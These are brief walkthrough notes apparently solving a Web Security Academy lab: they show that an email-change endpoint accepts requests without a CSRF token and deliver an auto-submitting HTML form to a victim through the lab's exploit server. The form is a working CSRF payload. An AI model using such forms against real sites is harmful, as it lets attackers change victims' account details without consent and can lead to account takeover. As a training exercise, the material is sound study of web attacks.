```bash
1. login: wiener user
2. update: email
3. send this request to the repaeter tab

TEST CASE
a. remove the CSRF token and send the request  --  302 Found  --  worked

4. update the email while intercepting the request
5. send this request to the repeater tab, drop all the request and turn off the intercept
6. generate a CSRF PoC

CSRF PAYLOAD  --  update the email value

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="mango@mail.com">
			<input type="submit" value="Submit Request">
		</form>
	</body>
  <script>document.forms[0].submit();</script>
</html>


7. press the back button of the browser  --  do not refresh the browser
8. go to the exploit server deliver to the victim and done
9. NOTE if you viewed the exploit then update the email value
```
